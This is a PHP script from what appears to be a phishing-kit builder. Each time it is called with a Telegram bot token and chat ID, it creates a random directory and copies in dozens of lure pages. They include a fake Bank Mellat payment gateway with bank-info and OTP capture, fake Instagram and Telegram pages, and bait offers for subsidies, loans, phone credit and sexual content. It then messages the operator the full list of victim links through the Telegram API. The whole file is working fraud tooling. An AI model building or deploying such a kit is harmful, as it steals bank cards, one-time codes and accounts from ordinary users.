<?php 

//CODED BY Geladiator
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}
//CODED BY Geladiator
header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

function cheack($TOKENMS){
$ok = json_decode(file_get_contents('https://api.telegram.org/bot'.$TOKENMS.'/getme'))->ok;
if($ok != true || strlen($TOKENMS) > 60){
die(header("Location:403.html"));

}
}
Usage:
cheack($_POST['TOKEN']);

//CODED BY Geladiator
$TOKENMS = stripslashes(htmlspecialchars($_POST['TOKEN']));
if(strstr($TOKENMS,'../source/')){
die('lfi and rfi detected');
}
$IDMS = intval(stripslashes(htmlspecialchars($_POST['ID'])));
if(strstr($IDMS,'../source/')){
die('lfi and rfi detected');
}
file_put_contents("ID.txt",$IDMS);
//CODED BY Geladiator
$Rand=rand(11111,99999); 
$TOKEN= '$TOKENESH';
$ID ='$IDISH';
mkdir($Rand);
$FileName = "$Rand/index.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
//Payment.mellat 
copy('../source/Mellat/Mellat.php', 'mellat.php'); 
copy('../source/Mellat/Mellat.php', 'index.php'); 
copy('../source/Mellat/Mellat.php', 'melat.php'); 
copy('../source/Mellat/Bankinfo.php', 'Bankinfo.php'); 
copy('../source/Mellat/xkiler.php', 'xkiler.php'); 
copy('../source/Mellat/OTP.php', 'OTP.php'); 
//page 
copy('../source/charj.php', 'charj.php');
copy('../source/sharj.php', 'sharj.php');
copy('../source/dostyabi.php', 'dostyabi.php');
copy('../source/sighe.php', 'sighe.php');
copy('../source/makan.php', 'makan.php');
copy('../source/tel.html', 'tel.html');
copy('../source/mi.html', 'mi.html');
copy('../source/kala.html', 'kala.html');
copy('../source/lokht.html', 'lokht.html');
copy('../source/mci.php', 'mci.php');
copy('../source/net6.php', 'net6.php');
copy('../source/6g.php', '6g.php');
copy('../source/number.php', 'number.php');
copy('../source/live.php', 'live.php');
copy('../source/cod.php', 'cod.php');
copy('../source/sheypoor.php', 'sheypoor.php');
copy('../source/snap.php', 'snap.php');
copy('../source/tash.php', 'tash.php');
copy('../source/chat.php', 'chat.php');
copy('../source/insta.html', 'insta.html');
copy('../source/yarane.html', 'yarane.html');
copy('../source/masaj.php', 'masaj.php');
copy('../source/dgkala.html', 'dgkala.html');
copy('../source/seil.html', 'seil.html');
copy('../source/mask.html', 'mask.html');
copy('../source/saham.html', 'saham.html');
copy('../source/5G.php', '5G.php');
copy('../source/6gn.php', '6gn.php');
copy('../source/about-ust.html', 'about-ust.html');
copy('../source/cartsokht.html', 'cartsokht.html');
copy('../source/charge.html', 'charge.html');
copy('../source/consol.html', 'consol.html');
copy('../source/corona.html', 'corona.html');
copy('../source/divar.html', 'divar.html');
copy('../source/divar1.html', 'divvar.html');
copy('../source/durbin.html', 'durbin.html');
copy('../source/hamta.html', 'hamta.html');
copy('../source/hania.php', 'hania.php');
copy('../source/idpay.html', 'idpay.html');
copy('../source/inatagrams.html', 'instagrams.html');
copy('../source/internetmeli.html', 'internetmeli.html');
copy('../source/kontrolapp.html', 'kontrolapp.html');
copy('../source/payping.html', 'payping.html');
copy('../source/pubguc.html', 'pubguc.html');
copy('../source/ramezan.html', 'ramezan.html');
copy('../source/reg2.php', 'reg2.php');
copy('../source/reg4.php', 'reg4.php');
copy('../source/reg6.php', 'reg6.php');
copy('../source/register.php', 'register.php');
copy('../source/rightelnet15.html', 'rightelnet15.html');
copy('../source/ronix.php', 'ronix.php');
copy('../source/rules-ust.html', 'rules-ust.html');
copy('../source/sabad-kala.php', 'sabad-kala.php');
copy('../source/takhfif.html', 'takhfif.html');
copy('../source/takhfif.html', 'takhfif-gir.html');
copy('../source/tmember.html', 'tmember.html');
copy('../source/vam.html', 'vam.html');
copy('../source/vpn.html', 'vpn.html');
copy('../source/yarane.html', 'yarane.html');
copy('../source/1sepb.html', '1sepb.html');
copy('../source/1sepf.html', '1sepf.html');
copy('../source/1sepl.html', '1sepl.html');
copy('../source/2sepb.html', '2sepb.html');
copy('../source/2sepf.html', '2sepf.html');
copy('../source/2sepl.html', '2sepl.html');
copy('../source/3sepb.html', '3sepb.html');
copy('../source/3sepf.html', '3sepf.html');
copy('../source/3sepl.html', '3sepl.html');
copy('../source/4sepb.html', '4sepb.html');
copy('../source/4sepf.html', '4sepf.html');
copy('../source/4sepl.html', '4sepl.html');
copy('../source/5sepb.html', '5sepb.html');
copy('../source/5sepf.html', '5sepf.html');
copy('../source/5sepl.html', '5sepl.html');
copy('../source/sheypoor.html', 'sheypoor.html');
copy('../source/instafacke.html', 'instafacke.html');
copy('../source/default.html', 'default.html');

?>
<center><P>درگاه شما ساخته شد .لینک ها به ربات شما ارسال شد</p></center>
<?php
?>
");
$FileName = "$Rand/Userid.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN ='$TOKENMS';
$ID = '$IDMS';
?>

");
	
		echo "<div id=stl>


</div>
"; 

include"info.php";

$Text = "╔ [ • 😈Your Links😈 • ] 
║  
╠ •Name : صفحه پرداخت ملت
╠ ⚡️Link : $link/$Rand/index.php
║ 
╠ •Name : 5گیگ اینترنت
╠ ⚡️Link : $link/$Rand/5G.php
║ 
╠ •Name : 6گیگ اینترنت
╠ ⚡️Link : $link/$Rand/6gn.php
║ 
╠ •Name : کارت سوخت
╠ ⚡️Link : $link/$Rand/cartsokht.html
║ 
╠ •Name : شارژ 
╠ ⚡️Link : $link/$Rand/charge.html
║  
╠ •Name : کنسول بازی (جدید)
╠ ⚡️Link : $link/$Rand/consol.html
║  
╠ •Name : کرونا
╠ ⚡️Link : $link/$Rand/corona.html
║  
╠ •Name : دیوار (جدید)
╠ ⚡️Link : $link/$Rand/divar.html
║  
╠ •Name : دیوار
╠ ⚡️Link : $link/$Rand/divvar.html
║  
╠ •Name : دوربین لخت کن (جدید)
╠ ⚡️Link : $link/$Rand/durbin.html
║  
╠ •Name : همتا
╠ ⚡️Link : $link/$Rand/hamta.html
║  
╠ •Name : صیغه 
╠ ⚡️Link : $link/$Rand/hania.php
║  
╠ •Name : تیک ابی اینستاگرام
╠ ⚡️Link : $link/$Rand/instagrams.html
║  
╠ •Name : نت ملی
╠ ⚡️Link : $link/$Rand/internetmeli.html
║  
╠ •Name : کنترل گوشی
╠ ⚡️Link : $link/$Rand/kontrolapp.html
║  
╠ •Name : پایپینگ
╠ ⚡️Link : $link/$Rand/payping.html
║  
╠ •Name : پاپجی
╠ ⚡️Link : $link/$Rand/pubguc.html
║  
╠ •Name : ماه رمضان
╠ ⚡️Link : $link/$Rand/ramezan.html
║  
╠ •Name :  سبد کالا
╠ ⚡️Link : $link/$Rand/sabad-kala.php
║  
╠ •Name : دریافت کد تخفیف
╠ ⚡️Link : $link/$Rand/takhfif.html
║  
╠ •Name : خرید ممبر
╠ ⚡️Link : $link/$Rand/tmember.html
║  
╠ •Name : وام یک میلونی
╠ ⚡️Link : $link/$Rand/vam.html
║  
╠ •Name : فیلترشکن
╠ ⚡️Link : $link/$Rand/vpn.html
║  
╠ •Name : ایدی پی
╠ ⚡️Link : $link/$Rand/idpay.html
║  
╠ •Name : صیغه
╠ ⚡️Link : $link/$Rand/sighe.php
║  
╠ •Name : لایو سکسی
╠ ⚡️Link : $link/$Rand/live.php
║  
╠ •Name : ماسک
╠ ⚡️Link : $link/$Rand/mask.html
║ 
╠ •Name :  شارژ ام سی ای
╠ ⚡️Link : $link/$Rand/mci.php
║  
╠ •Name : شارژ استار
╠ ⚡️Link : $link/$Rand/charj.php
║  
╠ •Name : دوستیابی
╠ ⚡️Link : $link/$Rand/dostyabi.php
║ 
╠ •Name : مکان یابی
╠ ⚡️Link : $link/$Rand/makan.php
║  
╠ •Name : خرید شارژ 
╠ ⚡️Link : $link/$Rand/sharj.php
║  
╠ •Name : فالوور
╠ ⚡️Link : $link/$Rand/default.html
║  
╠ •Name : سهام عدالت
╠ ⚡️Link : $link/$Rand/saham.html
║ 
╠ •Name : سیل زدگان
╠ ⚡️Link : $link/$Rand/seil.html
║  
╠ •Name : دیجی کالا
╠ ⚡️Link : $link/$Rand/dgkala.html
║  
╠ •Name : ماساژ
╠ ⚡️Link : $link/$Rand/masaj.php
║  
╠ •Name : یارانه
╠ ⚡️Link : $link/$Rand/yarane.html
║ 
╠ •Name : هک اینستاگرام
╠ ⚡️Link : $link/$Rand/insta.html
║  
╠ •Name : سکس چت 
╠ ⚡️Link : $link/$Rand/chat.php
║  
╠ •Name : ربات تشخیص انفجار
╠ ⚡️Link : $link/$Rand/tash.php
║  
╠ •Name : شارژ اسنپ
╠ ⚡️Link : $link/$Rand/snap.php
║ 
╠ •Name : هک تلگرام
╠ ⚡️Link : $link/$Rand/tel.html
║  
╠ •Name : سبد کالا 1
╠ ⚡️Link : $link/$Rand/kala.html
║  
╠ •Name : دوربین لخت کن
╠ ⚡️Link : $link/$Rand/lokht.html
║  
╠ •Name : شماره مجازی
╠ ⚡️Link : $link/$Rand/number.php
║ 
╠ •Name : رمز پویا 
╠ ⚡️Link : $link/$Rand/cod.php
║ 
╠ •Name : 6 گیگ اینترنت (جدید)
╠ ⚡️Link : $link/$Rand/net6.php
║  
╠ •Name : 6 گیگ اینترنت 
╠ ⚡️Link : $link/$Rand/6g.php
║  
╠ •Name : کنترل خانواده 
╠ ⚡️Link : $link/$Rand/kontrolapp.html
║  
╠ •Name : فیک پیج 
╠ ⚡️Link : $link/$Rand/instafacke.html
║  
╚ [ • @$chanel • ]
";

$ok =  file_get_contents("https://api.telegram.org/bot".$TOKENMS."/SendMessage?chat_id=".$IDMS."&text=".urlencode($Text));	
        	
     



?>


	<meta content='0;url=Success.php'http-equiv='refresh'/>
